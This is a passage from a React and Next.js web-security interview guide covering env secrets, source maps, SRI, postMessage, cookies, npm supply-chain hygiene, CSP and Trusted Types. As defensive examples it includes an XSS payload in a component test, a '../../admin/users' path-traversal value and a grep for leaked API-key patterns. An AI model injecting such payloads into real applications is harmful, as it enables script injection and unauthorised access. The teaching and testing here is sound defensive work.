    invoice && { id: invoice.id, total: invoice.total, status: invoice.status }
  );
}
```

Pages and actions call these functions instead of the database directly, so checks can't be forgotten.

## 225: What are React's taint APIs?

They are experimental functions that stop specific objects or values from being passed to Client Components.

```ts
import {
  experimental_taintObjectReference,
  experimental_taintUniqueValue,
} from "react";

experimental_taintObjectReference(
  "Do not pass the full user row to the client",
  userRow,
);
experimental_taintUniqueValue(
  "Do not pass the API key to the client",
  process,
  process.env.API_KEY,
);
```

If tainted data crosses into a Client Component's props, React throws an error. In Next.js you enable them with `experimental.taint: true`. They are an extra safety net, not the main protection.

## 226: How does Next.js handle environment variables on the server and client?

- Variables without `NEXT_PUBLIC_` are only available in server code. In client code, `process.env.X` is `undefined`.
- `NEXT_PUBLIC_` variables are inlined into the client bundle at build time, so changing them later needs a new build.
- Next.js loads `.env`, `.env.local`, `.env.production` and so on. `.env*.local` files should not be committed.

A common mistake is renaming a secret to `NEXT_PUBLIC_` just because "it was undefined in the browser".

## 227: What can go wrong with Vite's envPrefix and loadEnv?

Changing `envPrefix` to something broad like `APP_` can expose variables you didn't intend to share. Vite refuses an empty prefix for this reason. Another common mistake is in `vite.config.js`:

```js
// Dangerous: exposes ALL env vars, including secrets, to the client
const env = loadEnv(mode, process.cwd(), "");
export default { define: { "process.env": env } };
```

Only `define` the specific public values you need.

## 228: What is the difference between build-time and runtime config in a React app?

Build-time config is inlined into the bundle (`import.meta.env`, `NEXT_PUBLIC_`). It needs a rebuild to change and is visible to everyone. Runtime config is loaded when the app starts, for example from `/config.json` or from a server-rendered page, so one build can run in several environments. Both are public in the browser. The only way to keep a value secret is to never send it to the browser.

## 229: How do you check that no secrets ended up in your bundle?

- Search the build output: `grep -rE "sk_live|AKIA|-----BEGIN" dist/`.
- Run secret scanners like gitleaks or trufflehog on the repo and in CI.
- Turn on GitHub secret scanning and push protection.
- Check the list of env variables used in client code during review.
- Open the deployed app and search its JavaScript files in DevTools.

If a secret leaks, rotate it right away; deleting it from code doesn't help since it is already public.

## 230: How should you handle .env files in a React project?

- Commit a `.env.example` with names and fake values.
- Keep real values in `.env.local` (or similar) and add `.env*.local` to `.gitignore`.
- Store production secrets in your hosting platform or a secrets manager, not in files.
- Never put secrets in client-prefixed variables.
- Make sure the web server never serves `.env` files.

## 231: What are hidden source maps and how do you use them with an error tracker?

A hidden source map is generated, but the bundle doesn't include the `sourceMappingURL` comment, so browsers don't load it. You upload the maps to your error tracker during CI, then delete them from the deploy folder.

```js
// vite.config.js
export default { build: { sourcemap: "hidden" } };
```

```bash
npx @sentry/cli sourcemaps upload --release "$RELEASE" ./dist
find dist -name '*.map' -delete
```

You get readable stack traces in Sentry while users can't easily read your source.

## 232: How do source maps work in Next.js production builds?

By default, Next.js does not create browser source maps in production. You can turn them on with `productionBrowserSourceMaps: true` in `next.config.js`, which makes them public. If you use Sentry, its Next.js integration can create source maps, upload them and delete them from the output, so you get readable errors without serving the maps.

## 233: How do you set clickjacking protection headers in Next.js?

Use the `headers()` function in `next.config.js` (or set them in the proxy or the hosting config):

```js
module.exports = {
  async headers() {
    return [
      {
        source: "/(.*)",
        headers: [
          { key: "Content-Security-Policy", value: "frame-ancestors 'none'" },
          { key: "X-Frame-Options", value: "DENY" },
        ],
      },
    ];
  },
};
```

If you already set a full CSP elsewhere, add `frame-ancestors` to it instead of sending two CSP headers.

## 234: Why is JavaScript frame-busting code a weak clickjacking defense?

Old code like `if (top !== self) top.location = self.location` can be blocked. The attacker can use the iframe `sandbox` attribute to stop your scripts or top navigation, or interfere with the code in other ways. HTTP headers (`frame-ancestors`, `X-Frame-Options`) are enforced by the browser before your page even runs, so they are the right defense.

## 235: How do you generate an SRI hash?

Use the `openssl` command line, or a site like srihash.org:

```bash
curl -s https://cdn.example.com/lib@1.2.3/lib.min.js \
  | openssl dgst -sha384 -binary \
  | openssl base64 -A
```

Prefix the result with `sha384-` and put it in the `integrity` attribute. Many CDNs, like cdnjs and jsDelivr, show the SRI hash on the package page.

## 236: Can bundlers add SRI to your own chunks?

Yes. For webpack, `webpack-subresource-integrity` adds `integrity` to the script and link tags it generates, including lazy-loaded chunks. Next.js has an experimental `sri` option for this. Vite needs a community plugin. SRI on your own files matters most when they are served from a separate CDN domain; it protects you if that CDN or bucket is changed.

## 237: How do you send messages safely with postMessage?

Always pass the exact target origin, never `'*'`, when the message contains anything sensitive.

```js
// Parent sending to an iframe
iframeRef.current.contentWindow.postMessage(
  { type: "init", theme: "dark" },
  "https://widget.example.com",
);
```

If the iframe navigated to another site, the browser will not deliver the message. With `'*'`, it would be delivered to whoever is in that frame now.

## 238: How do you receive postMessage events safely in a React component?

```jsx
useEffect(() => {
  function onMessage(event) {
    if (event.origin !== "https://widget.example.com") return;
    if (event.source !== iframeRef.current?.contentWindow) return;

    const data = event.data;
    if (typeof data !== "object" || data?.type !== "resize") return;
    if (typeof data.height !== "number") return;

    setHeight(Math.min(data.height, 2000));
  }
  window.addEventListener("message", onMessage);
  return () => window.removeEventListener("message", onMessage);
}, []);
```

Check the origin, check the source window, validate the data, and clean up the listener.

## 239: Why must you validate the data in a postMessage event even after checking origin?

The origin check tells you who sent it, not that the data is safe. The trusted page could have its own XSS bug, or a bug that sends unexpected values. If you put `event.data` into `innerHTML`, `location.href` or `eval`, you still have a vulnerability. Validate the shape with a schema and treat values as untrusted.

## 240: Why is combining allow-scripts and allow-same-origin in iframe sandbox dangerous?

If the iframe content is from your own origin, `allow-scripts` plus `allow-same-origin` lets the framed code reach into the parent page (same origin) and remove the `sandbox` attribute from its own iframe, which defeats the sandbox. Only combine them for content on a different origin that you trust. For untrusted HTML, use `sandbox="allow-scripts"` alone, or serve it from a separate domain.

## 241: What does the iframe allow attribute do?

`allow` sets the Permissions Policy for the iframe, meaning which powerful features its content can use.

```jsx
<iframe
  src="https://video.example.com/embed/123"
  allow="fullscreen; picture-in-picture"
  sandbox="allow-scripts allow-same-origin allow-presentation"
  referrerPolicy="strict-origin-when-cross-origin"
  title="Video"
/>
```

Do not grant `camera`, `microphone`, `geolocation` or `payment` to embeds that don't need them.

## 242: How do you use npm audit without drowning in noise?

- Use `--audit-level=high` in CI so only serious issues fail the build.
- Use `--omit=dev` to see what can reach production; dev tooling issues (like in a test runner) usually matter less for the deployed app, but still matter for CI.
- Check if the vulnerable code is actually used before rushing.
- Avoid `npm audit fix --force` without review; it can install breaking major versions.
- Use `overrides` in `package.json` to pin a fixed version of a deep dependency when the parent hasn't updated.

## 243: Why run npm ci with --ignore-scripts in CI?

Packages can define `preinstall`, `install` and `postinstall` scripts that run during install, with access to your environment, including CI secrets. Most malicious npm packages use these scripts. `--ignore-scripts` stops them. Some packages need build scripts (for native modules), so you may need to run those few explicitly. pnpm v10 does not run dependency install scripts unless you allow them.

## 244: What are the trade-offs of pinning exact dependency versions?

Exact versions (`"react": "19.3.0"`) make it clear what you run and avoid surprise updates, but you must update them on purpose, for example with Renovate. Ranges (`^19.3.0`) let new versions in when the lockfile is regenerated. The lockfile pins exact versions either way, so the most important rules are: commit the lockfile, use `npm ci`, and review lockfile changes in pull requests.

## 245: How would you configure Renovate or Dependabot for a React project?

Group related updates and set schedules so the team is not flooded, but let security fixes through right away.

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: npm
    directory: /
    schedule:
      interval: weekly
    groups:
      react:
        patterns: ["react", "react-dom", "@types/react*"]
    open-pull-requests-limit: 10
```

Make sure CI tests run on these PRs before merging.

## 246: What should you look for when reviewing lockfile changes?

- New packages you didn't expect, especially in a small PR.
- Packages resolved from a different registry or a git URL.
- Big version jumps of deep dependencies.
- Integrity hash changes without version changes.

Tools like `lockfile-lint` can check that all packages come from your allowed registry over HTTPS.

## 247: What do tools like Snyk and Socket add on top of npm audit?

`npm audit` only reports known CVEs. Snyk adds its own vulnerability database, fix advice and PR checks. Socket looks at package behavior: new install scripts, network or filesystem access, obfuscated code, or a new maintainer. That helps catch malicious packages before a CVE exists. GitHub Dependabot alerts and OSV-Scanner are free options for known issues.

## 248: How do you write an error boundary that hides details but logs them?

```jsx
import { ErrorBoundary } from "react-error-boundary";

function Fallback({ resetErrorBoundary }) {
  return (
    <div role="alert">
      <p>Something went wrong. Please try again.</p>
      <button onClick={resetErrorBoundary}>Retry</button>
    </div>
  );
}

<ErrorBoundary
  FallbackComponent={Fallback}
  onError={(error, info) =>
    reportError(error, { componentStack: info.componentStack })
  }
>
  <Dashboard />
</ErrorBoundary>;
```

Users see a simple message; developers get the full error in the logging service.

## 249: What do React 19's root error options do?

`createRoot` and `hydrateRoot` accept `onCaughtError`, `onUncaughtError` and `onRecoverableError`. They let you send all React errors to your monitoring service from one place, instead of relying only on `console.error`.

```js
createRoot(container, {
  onUncaughtError: (error, info) => reportError(error, info),
  onCaughtError: (error, info) => reportError(error, info),
}).render(<App />);
```

Make sure what you report doesn't include tokens or personal data.

## 250: How do you scrub sensitive data before sending errors to Sentry?

Use `beforeSend` (and `beforeBreadcrumb`) to remove fields, and turn off default PII collection.

```js
Sentry.init({
  dsn: "https://publicKey@o0.ingest.sentry.io/0",
  sendDefaultPii: false,
  beforeSend(event) {
    if (event.request?.headers) delete event.request.headers.Authorization;
    if (event.request?.cookies) delete event.request.cookies;
    return event;
  },
});
```

Also configure server-side scrubbing rules in Sentry for patterns like emails and card numbers. The DSN itself is public by design.

## 251: How do error pages work in the Next.js App Router, and what do they show in production?

An `error.tsx` file in a route segment is a Client Component that acts as an error boundary. In production, errors thrown in Server Components reach it with a generic message and a `digest` property, not the original message, so server details don't leak.

```tsx
"use client";

export default function Error({
  error,
  reset,
}: {
  error: Error & { digest?: string };
  reset: () => void;
}) {
  return (
    <div>
      <p>Something went wrong. Reference: {error.digest}</p>
      <button onClick={() => reset()}>Try again</button>
    </div>
  );
}
```

The `digest` lets you find the full error in your server logs.

## 252: Can you hide data from React DevTools in production?

Not really. There are tricks to disable the DevTools hook, but users control their own browser, so this is easy to get around and adds no security. The right approach is to only send the browser data the user is allowed to see. If something should not be visible in DevTools, it should not be in the client at all.

## 253: How do you turn off Redux DevTools in production?

Redux Toolkit's `configureStore` takes a `devTools` option.

```js
export const store = configureStore({
  reducer,
  devTools: process.env.NODE_ENV !== "production",
});
```

This stops the extension from easily reading and replaying actions and state in production, which also prevents users from dispatching fake actions through it. It is good hygiene, not real protection, since the state is still in memory.

## 254: What should you watch out for when persisting state with redux-persist or Zustand persist?

These save state to localStorage by default, so everything you persist is stored in plain text, survives logout unless cleared, and is readable by any script. Use a `whitelist` or `partialize` to persist only harmless UI data like theme or filters. Never persist tokens, personal data or API responses with private data. Clear storage on logout.

```js
persist((set) => ({ theme: "light", user: null }), {
  name: "app-ui",
  partialize: (state) => ({ theme: state.theme }),
});
```

## 255: Why should you clear the TanStack Query cache on logout?

The query cache holds API responses for the current user. If you only clear the token, the next user on the same tab can see cached data, for example their predecessor's orders. Clear it on logout:

```js
async function logout() {
  await api.post("/auth/logout");
  queryClient.clear();
  resetStores();
  navigate("/login");
}
```

If you persist the query cache to storage, clear that too.

## 256: What should you reset in the app state when a user logs out?

- Tokens in memory and any storage.
- Server-state caches (TanStack Query, SWR, Apollo).
- Global stores (Redux, Zustand, context).
- Persisted state in localStorage, sessionStorage, IndexedDB.
- Service worker caches that hold user data.
- Open WebSocket connections.

A full page reload after logout (`window.location.assign('/login')`) is a simple way to clear memory state.

## 257: How do you test that a component does not render HTML from user input?

Render the component with an XSS payload and check that it shows text and no element was created.

```jsx
import { render, screen } from "@testing-library/react";

test("comment is rendered as text", () => {
  const payload = '<img src=x onerror="window.__xss = true">';
  const { container } = render(<Comment body={payload} />);

  expect(screen.getByText(payload)).toBeInTheDocument();
  expect(container.querySelector("img")).toBeNull();
});
```

For a `SafeHtml` component, test that `<script>` and `onerror` are removed while allowed tags stay.

## 258: How do you set up ESLint security rules for a React project?

```js
// eslint.config.js
import react from "eslint-plugin-react";

export default [
  {
    plugins: { react },
    rules: {
      "react/no-danger": "error",
      "react/jsx-no-script-url": "error",
      "react/jsx-no-target-blank": "error",
      "no-eval": "error",
      "no-implied-eval": "error",
      "no-new-func": "error",
    },
  },
];
```

Allow `no-danger` only in your `SafeHtml` component with a disable comment, so every other use needs a reviewed exception.

## 259: How can you use OWASP ZAP against a React app?

ZAP is a free DAST tool. Point it at a running copy of your app (never production without permission). The baseline scan checks headers and common issues quickly; a full scan also tries attacks. For SPAs, use the AJAX spider or a browser-based crawler so ZAP can find routes rendered by JavaScript, and give it a logged-in session so it can test protected pages and APIs. It can run in CI with the official Docker images.

## 260: How do you check a deployed app's security headers?

Run `curl -sI https://app.example.com` and read the headers, or use online scanners like Mozilla HTTP Observatory or securityheaders.com. In CI, you can write a small test that requests the main page and checks that `Content-Security-Policy`, `Strict-Transport-Security`, `X-Content-Type-Options` and `Referrer-Policy` exist with expected values, so they don't disappear in a config change.

## 261: How do you test access control with Playwright?

Write tests that log in as a low-privilege user and try things they should not be able to do, both through the UI and through the API directly.

```ts
test("regular user cannot delete invoices via API", async ({ request }) => {
  const res = await request.delete("/api/invoices/inv_123", {
    headers: { Authorization: `Bearer ${regularUserToken}` },
  });
  expect(res.status()).toBe(403);
});
```

UI tests that check the button is hidden are useful, but the API test is the one that proves security.

## 262: How should a React app handle file uploads securely?

On the client: check size and type to give quick feedback, show previews with `URL.createObjectURL` (and revoke it later), and never insert the file content as HTML. On the server: check size, real file type from content, scan for malware if needed, rename files, store them outside the web root or in object storage, and serve them with the right `Content-Type`, `Content-Disposition` and `X-Content-Type-Options: nosniff`.

## 263: How do you safely show images that users uploaded?

- Use `<img src>` instead of inline markup, especially for SVG.
- Serve user files from a separate domain (like `usercontent.example.com`) so any script inside can't reach your app's origin.
- Strip metadata like GPS (EXIF) on the server if privacy matters.
- Use signed or private URLs for private images.
- Add `img-src` rules in your CSP for that domain.

## 264: How do you build query strings safely in React?

Use `URLSearchParams` or the `URL` API instead of string concatenation.

```js
const url = new URL("/api/search", window.location.origin);
url.searchParams.set("q", query);
url.searchParams.set("page", String(page));
const res = await fetch(url);
```

This encodes `&`, `=`, `#` and spaces, so user input can't add extra parameters like `&admin=true`.

## 265: What is client-side path traversal in API calls?

If you build an API path from user input without encoding, the user can add `../` to change which endpoint gets called, with the user's own credentials.

```js
// id from the URL: "../../admin/users"
fetch(`/api/projects/${id}/files`); // may call /api/admin/users/files
```

Use `encodeURIComponent(id)`, validate IDs with a pattern (like UUID), and make sure the server checks access for every endpoint.

## 266: How do you handle external links with React Router or Next.js Link components?

These components are built for internal navigation. For user-provided or external URLs, use a plain `<a>` with a validated URL and the right `rel`.

```tsx
function SmartLink({
  href,
  children,
}: {
  href: string;
  children: React.ReactNode;
}) {
  const url = new URL(href, window.location.origin);
  if (url.origin === window.location.origin) {
    return <Link to={url.pathname + url.search}>{children}</Link>;
  }
  if (url.protocol !== "https:") return <span>{children}</span>;
  return (
    <a href={url.href} target="_blank" rel="noopener noreferrer">
      {children}
    </a>
  );
}
```

## 267: Why is assigning user input to window.location dangerous?

`window.location.href = value`, `location.assign(value)` and `location.replace(value)` are navigation sinks. With a `javascript:` URL, they run code (React's protection doesn't apply here since React isn't involved). With an external URL, you create an open redirect. Validate the URL first, and for internal navigation prefer the router's `navigate` with a path you built yourself.

## 268: Why should values from useSearchParams or useParams be treated as untrusted?

They come from the URL, which anyone can craft and send in a link. Showing them as text is fine, but don't put them into `href`, `dangerouslySetInnerHTML`, API paths without encoding, or redirects without checking. Also validate their format, for example with `z.coerce.number().int().positive()` for a page number, so bad input doesn't cause errors.

## 269: How can you show untrusted HTML, like an email, without risking your app?

Render it inside a sandboxed iframe with `srcDoc`, and still sanitize it.

```jsx
<iframe
  sandbox=""
  srcDoc={DOMPurify.sanitize(emailHtml)}
  title="Email preview"
  referrerPolicy="no-referrer"
/>
```

An empty `sandbox` blocks scripts, forms, popups and top navigation, and gives the content a unique origin, so it cannot read your cookies or DOM. Add `allow-popups` only if links must open.

## 270: Should CMS content be treated as trusted HTML?

Only partly. CMS editors are usually staff, but CMS accounts get phished, CMS plugins have bugs, and some fields might come from users. If a CMS sends HTML, sanitize it with an allowlist that matches what editors need. A safer design is structured content (like Portable Text or JSON blocks) that you render with React components.

## 271: How do you show translations that contain HTML safely in react-i18next?

Use the `Trans` component, which turns placeholders into React elements, instead of putting the translated string into `dangerouslySetInnerHTML`.

```jsx
// "welcome": "Hello <bold>{{name}}</bold>, read our <link>terms</link>."
<Trans
  i18nKey="welcome"
  values={{ name: user.name }}
  components={{ bold: <strong />, link: <a href="/terms" /> }}
/>
```

react-i18next sets `escapeValue: false` because React already escapes. That is fine for normal rendering, but makes interpolated values raw if you ever use the output as HTML.

## 272: How can toast, tooltip or chart libraries introduce XSS?

Many of them accept HTML strings in options like `html: true`, `formatter` or `content`, and set them with `innerHTML`. If you pass user data, for example a username in a chart tooltip, you get XSS even though your own code never used `dangerouslySetInnerHTML`. Prefer options that take React nodes or plain text, escape data in formatter functions, and read the docs for HTML-related options.

## 273: Why should dynamic import paths never come from user input?

``import(`./plugins/${name}.js`)`` with user input could load modules you did not mean to expose, and in some setups even remote URLs. Bundlers create chunks for every file that matches the pattern, so all of them become loadable. Map allowed names to imports instead:

```js
const loaders = {
  chart: () => import("./plugins/chart.js"),
  table: () => import("./plugins/table.js"),
};
const load = loaders[name];
if (load) await load();
```

## 274: How do you render JSON-LD structured data safely in React?

JSON-LD goes in a `<script type="application/ld+json">`. Escape `<` so values cannot close the tag.

```jsx
function JsonLd({ data }) {
  const json = JSON.stringify(data).replace(/</g, "\\u003c");
  return (
    <script
      type="application/ld+json"
      dangerouslySetInnerHTML={{ __html: json }}
    />
  );
}
```

Product names or reviews in the data may come from users, so this escaping is required. Next.js docs show the same approach.

## 275: How do analytics and tag managers fit into a strict CSP?

Tag managers load many scripts from many domains and often inject inline code, which conflicts with a strict CSP. Options: use a nonce with `'strict-dynamic'` so the trusted loader can add scripts; use server-side tagging to reduce browser scripts; or keep only the analytics you really need. Each vendor added to the tag manager can run code on your page, so control who can publish tags.

## 276: What does a well-configured auth cookie look like?

```
Set-Cookie: __Host-session=9f2c...; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=3600
```

- `__Host-` prefix: must be `Secure`, `Path=/` and have no `Domain`, so subdomains can't set or read it.
- `HttpOnly`: JavaScript can't read it.
- `Secure`: HTTPS only.
- `SameSite=Lax`: not sent on cross-site POSTs.
- `Max-Age`: limited lifetime.

## 277: What do the __Host- and __Secure- cookie prefixes do?

Browsers enforce rules for cookies with these name prefixes:

- `__Secure-`: must be set with `Secure` from an HTTPS page.
- `__Host-`: must be `Secure`, have `Path=/`, and no `Domain` attribute, so it is locked to that exact host.

`__Host-` stops a compromised or malicious subdomain from overwriting your session or CSRF cookie (cookie tossing).

## 278: How do cookie Domain and Path affect security?

If you set `Domain=example.com`, the cookie is sent to every subdomain, including `blog.example.com` or a marketing site hosted by a vendor. Leaving out `Domain` keeps it to the exact host. `Path` limits which paths it is sent to, for example `Path=/auth/refresh` for a refresh token cookie, but it is not a security boundary against scripts on the same origin.

## 279: What are the trade-offs between sending tokens in the Authorization header and using cookies?

- **Authorization header**: no CSRF risk, works across domains and with mobile clients, but the token must be readable by JavaScript, so XSS can steal it.
- **httpOnly cookie**: XSS can't read it, but cookies are sent automatically, so you need CSRF protection and correct CORS and `SameSite` settings. Cross-domain setups are more complex.

Many teams use cookies for browser apps (or a BFF) and headers for service-to-service and mobile calls.

## 280: How do you schedule a token refresh before expiry?

Read `exp` from the access token (or `expires_in` from the token response) and refresh a bit before it expires.

```js
import { jwtDecode } from "jwt-decode";

function scheduleRefresh(token) {
  const { exp } = jwtDecode(token);
  const delay = exp * 1000 - Date.now() - 60_000; // 1 minute early
  return setTimeout(refreshAccessToken, Math.max(delay, 0));
}
```

Still keep the 401 handler, because timers stop when the laptop sleeps, and the server may revoke tokens early.

## 281: Why does clock skew matter for token expiry on the client?

The user's computer clock may be minutes or hours off. If you compare `exp` with `Date.now()`, a fast clock can make the app think a fresh token is expired and refresh in a loop, and a slow clock makes it use expired tokens. Refresh a bit early, use `expires_in` (relative seconds) from the token response when possible, and always fall back to handling 401s.

## 282: How should the UI handle a 403 response?

Show a clear "you don't have access" message, don't retry and don't refresh the token. Log the event for monitoring. If the 403 happens on page load, render a dedicated "access denied" page instead of a broken page. Avoid revealing whether the resource exists; some APIs return 404 instead of 403 to avoid this.

## 283: How should the UI handle 429 Too Many Requests?

Show a friendly message, disable the action for a while, and if the server sends `Retry-After`, wait that long before allowing a retry. Do not auto-retry in a fast loop, which makes the problem worse. On login forms, a 429 often means rate limiting against password guessing; tell the user to wait.

## 284: How do you avoid user enumeration in login and reset forms?

Show the same message whether the email exists or not, for example "If an account exists for this email, we sent a reset link." For login, use "Email or password is incorrect" instead of "No account with this email". The server must also respond in similar time and with the same status. The UI text only matters if the API behaves the same way.

## 285: What front-end mistakes are common in password reset flows?

- Leaving the reset token in the URL after use; clear it with `history.replaceState` and set `Referrer-Policy` so it doesn't leak.
- Loading third-party scripts on the reset page that can see the URL.
- Not logging the user out of other sessions after the reset (server side).
- Showing whether the email exists.
- Accepting a new password without the same strength rules the server enforces.

## 286: How do you secure WebSocket connections from a React app?

- Use `wss://` only.
- Authenticate the connection: a short-lived token in the first message or a cookie, not a long-lived token in the URL.
- The server must check the `Origin` header during the handshake, because WebSockets are not covered by CORS and cookies are sent automatically (cross-site WebSocket hijacking).
- Authorize every message or subscription on the server.
- Close the socket on logout.

## 287: What security issues come with service workers in React apps?

A service worker can intercept all requests in its scope, so a malicious one is very powerful and stays after the page is closed. Risks include caching authenticated API responses that the next user sees, and an XSS bug registering an attacker's service worker. Only cache public assets, never cache responses with user data unless you clear them on logout, keep the worker script on your own origin, and use `Clear-Site-Data` on logout if needed.

## 288: Why should sensitive API responses use Cache-Control: no-store?

Without it, browsers, proxies or CDNs may store responses with personal data. On shared computers, the back button or the browser cache could show them to the next user, and a misconfigured CDN may serve them to other users.

```
Cache-Control: no-store
```

Use `private` for user-specific data that can be cached only in the user's browser, and `no-store` for highly sensitive data.

## 289: How should you handle the clipboard with sensitive data?

Copying secrets (like API keys or recovery codes) with `navigator.clipboard.writeText` is fine when the user clicks "Copy", but the clipboard can be read by other apps and clipboard managers. Don't copy sensitive data automatically, show a short message after copying, and consider masking secrets by default. Reading the clipboard requires permission in most browsers, so only do it on a clear user action.

## 290: Why can Storybook or preview deployments be a security risk?

Public Storybook builds and preview deploys (per pull request) are easy to forget. They might connect to real APIs, contain mock data copied from production, include source maps and debug flags, or expose unreleased features. Protect them with authentication or IP restrictions, use fake data, and don't give preview environments production secrets.

## 291: How can build configuration leak details across environments?

If the same build uses env variables from the wrong environment, a production bundle might include staging API URLs, test keys, debug flags or a mock-login feature. Use separate build pipelines per environment, check which variables are used in client code, and fail the build if debug flags are set in production. Search the production bundle for words like `staging` or `localhost` as a check.

## 292: Why are debug or test-only routes dangerous in production?

Routes like `/debug`, `/test-login` or "login as any user" buttons made for development often skip normal checks. If they ship to production, even hidden from menus, attackers can find them in the bundle. Remove them at build time with environment checks that the bundler strips, and make sure the server endpoints behind them don't exist in production at all.

```js
if (import.meta.env.DEV) {
  routes.push({ path: "/debug", Component: DebugPage });
}
```

## 293: What would you check in a security code review of a React pull request?

- New `dangerouslySetInnerHTML`, refs with `innerHTML`, or HTML-accepting library options.
- URLs from users or APIs used in `href`, `src`, redirects or `window.location`.
- Props spread from external data.
- New env variables in client code.
- Auth or permission checks done only in the UI.
- New Server Actions or API routes without auth and validation.
- Sensitive data in logs, state, storage or props passed to client components.
- New dependencies: who maintains them and what they do.

## 294: How do you validate a Server Action's FormData file upload?

```ts
"use server";

const MAX = 5 * 1024 * 1024;
const TYPES = new Set(["image/png", "image/jpeg", "image/webp"]);

export async function uploadAvatar(formData: FormData) {
  const session = await auth();
  if (!session?.user) throw new Error("Unauthorized");

  const file = formData.get("avatar");
  if (
    !(file instanceof File) ||
    file.size === 0 ||
    file.size > MAX ||
    !TYPES.has(file.type)
  ) {
    return { error: "Please upload a PNG, JPEG or WebP image under 5 MB." };
  }
  // file.type comes from the client; check the real content (magic bytes) before storing
  await saveAvatar(session.user.id, Buffer.from(await file.arrayBuffer()));
  return { error: null };
}
```

Next.js limits Server Action bodies to 1 MB by default; raise `serverActions.bodySizeLimit` only as much as needed.

## 295: How do you configure allowed origins for Server Actions behind a proxy?

Next.js compares the request's `Origin` with the `Host` (or `X-Forwarded-Host`) to block cross-site action calls. If your app runs behind a proxy or on several domains, those may differ, and actions fail. Add the trusted domains explicitly instead of turning checks off.

```js
// next.config.js
module.exports = {
  experimental: {
    serverActions: {
      allowedOrigins: ["app.example.com", "*.app.example.com"],
    },
  },
};
```

## 296: How do you mask sensitive inputs in session replay tools?

Tools like Sentry Replay, LogRocket or FullStory record the DOM and user input. Make sure they mask all text and inputs by default, or at least password, payment and personal fields. They usually support CSS classes or data attributes to block elements:

```jsx
<input name="ssn" className="sentry-mask" data-private />
```

Check their default settings, test a recording, and make sure your privacy policy covers it.

## 297: How do you check that your CSP works before enforcing it?

1. Deploy it as `Content-Security-Policy-Report-Only` with a report endpoint.
2. Use the app normally, including login, payments and third-party widgets.
3. Read the violation reports and the browser console.
4. Fix the code or adjust the policy.
5. Switch to the enforcing header, and keep reporting on.

Run end-to-end tests with the enforcing header in staging so regressions are caught.

## 298: What is the difference between X-XSS-Protection and CSP?

`X-XSS-Protection` turned on an old XSS filter in some browsers. Modern browsers removed that filter because it had its own security problems, so the header does nothing useful now; OWASP suggests not setting it, or setting it to `0`. CSP is the modern, supported way to limit what scripts can run.

## 299: Why should a React app not use the Referer header or document.referrer for security decisions?

The `Referer` header can be missing (privacy settings, `Referrer-Policy`, HTTPS to HTTP) and is easy to fake outside a browser. `document.referrer` in the client is just a value the user's browser gives you. Use proper checks like `Origin` validation on the server, CSRF tokens and session checks instead.

## 300: How would you explain the "shared responsibility" between React and the developer for security?

React handles some things for you: escaping JSX text and attributes, and blocking `javascript:` URLs in React 19. Everything else is up to you and your server: sanitizing HTML, validating URLs and redirects, auth and permission checks, token storage, CSRF, CORS, headers, secrets and dependencies. React lowers the chance of the most common bug, but it does not make an app secure by itself.

# Advanced Questions (301-450)

## 301: How does React escape values internally, and why does context still matter?

On the client, React creates text with `document.createTextNode` or `textContent`, and sets attributes with `setAttribute` or DOM properties. These APIs never parse HTML, so no escaping is even needed. During SSR, React escapes `&`, `<`, `>`, `"` and `'` in text and attribute values before writing HTML.

This only protects the HTML structure. The browser still interprets the value according to where it is used: a URL in `href`, CSS in `style`, code in an event handler string set through a ref. Escaping for HTML doesn't make a string safe in those contexts, so you still need context-specific checks.

## 302: What is mutation XSS (mXSS) and why does it matter for sanitizers?

Mutation XSS happens when HTML that looks safe after sanitizing changes into dangerous HTML when the browser parses or serializes it again. This happens with tricky nesting of tags like `<noscript>`, `<svg>`, `<math>`, `<template>` or `<style>`, where parsing rules differ. Attackers find inputs that the sanitizer sees as harmless but the browser rebuilds into a script.

Defenses: use a well-maintained sanitizer (DOMPurify fixes these quickly), keep it updated, sanitize right before inserting, don't modify the HTML string after sanitizing, and remove SVG and MathML if you don't need them.

## 303: Should you sanitize HTML when it is saved or when it is shown?

Ideally both, for different reasons. Sanitizing on save keeps dangerous content out of your database and protects other consumers (mobile apps, emails). Sanitizing on output protects against old data saved before your rules existed, sanitizer bypasses fixed in newer versions, and data written by other systems. If you can do only one, do it at output, right before rendering, because that is the context that matters. Keep the original raw input if you might need to re-sanitize later with better rules.

## 304: How do you combine DOMPurify, Trusted Types and React?

Create a Trusted Types policy around DOMPurify, or ask DOMPurify for a `TrustedHTML` directly, and pass the result to React.

```tsx
const clean = DOMPurify.sanitize(html, { RETURN_TRUSTED_TYPE: true });
<div dangerouslySetInnerHTML={{ __html: clean as unknown as string }} />;
```

For this to work under `require-trusted-types-for 'script'`, React must pass the `TrustedHTML` object to `innerHTML` without turning it into a string. Older React versions stringified values, which made enforcement throw errors. React added a Trusted Types integration (merged in early 2026) that forwards these objects to the DOM. Check whether your React version has it turned on before enforcing Trusted Types; otherwise run in report-only mode or use a `default` policy during migration.

## 305: How would you roll out Trusted Types in a large existing React app?

1. Turn on `Content-Security-Policy-Report-Only: require-trusted-types-for 'script'; report-to ...`.
2. Collect reports for a few weeks to find every sink that gets plain strings: your code, libraries, analytics.
3. Replace sinks where you can (use JSX, `textContent`), and route the rest through one or two named policies.
4. Add a `default` policy that logs and sanitizes, as a temporary bridge for libraries.
5. Enforce, with `trusted-types` listing only the allowed policy names.
6. Add lint rules so new code uses the policies.

## 306: How do you build a strict CSP for a static SPA hosted on a CDN?

Nonces need a fresh value per response, which a static CDN can't easily do. For a static SPA, use hashes or `'self'`:

- Bundle all scripts as files and use `script-src 'self'`, with no inline scripts.
- If you must have an inline script (like a theme script to avoid a flash), use its SHA-256 hash: `script-src 'self' 'sha256-...'`.
- Add `object-src 'none'; base-uri 'none'; frame-ancestors 'none'`.
- Limit `connect-src` to your API domains.

Some edge platforms can inject per-request nonces with edge functions if you need `'strict-dynamic'`.

## 307: What are the trade-offs between CSP nonces and hashes?

- **Nonces**: easy for dynamic pages and third-party loaders (with `'strict-dynamic'`), but the HTML must be generated per request, which blocks full-page caching and static generation.
- **Hashes**: work with static and cached HTML, but every inline script change changes the hash, and they don't help with external scripts unless the browser supports hashes for them with `'strict-dynamic'`.

SSR apps usually use nonces; static SPAs usually use `'self'` plus hashes.

## 308: Why does a nonce-based CSP force dynamic rendering in Next.js?

